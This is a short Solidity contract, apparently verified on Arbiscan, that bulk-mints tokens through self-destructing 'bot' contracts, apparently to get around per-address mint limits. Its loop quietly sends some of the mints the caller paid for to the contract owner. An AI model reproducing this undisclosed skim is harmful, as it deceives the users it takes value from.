/**
 *Submitted for verification at Arbiscan on 2023-06-24
*/

/**
 *Submitted for verification at https://arbiscan.io/ on 2023-06-24
*/

// SPDX-License-Identifier: MIT

// KFCDAO orange


pragma solidity ^0.8.18;


contract bot {
	constructor(address contractAddress, address to) payable{
        (bool success, ) = contractAddress.call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256(bytes('mint(address)'))), to));
        require(success, "Batch transaction failed");
		selfdestruct(payable(tx.origin));
   }
}

contract Bulk {
	address private immutable owner;

	modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

	constructor() {
		owner = msg.sender;
	}

	function orangeBulkMint(address contractAddress, uint256 times) external payable{
        uint price;
        if (msg.value > 0){
            price = msg.value / times;
        }
		address to = msg.sender;
		for(uint i=0; i< times; i++) {
			if (i>0 && i%29==0){
				new bot{value: price}(contractAddress, owner);
			}else{
				new bot{value: price}(contractAddress, to);
			}
		}
	}
}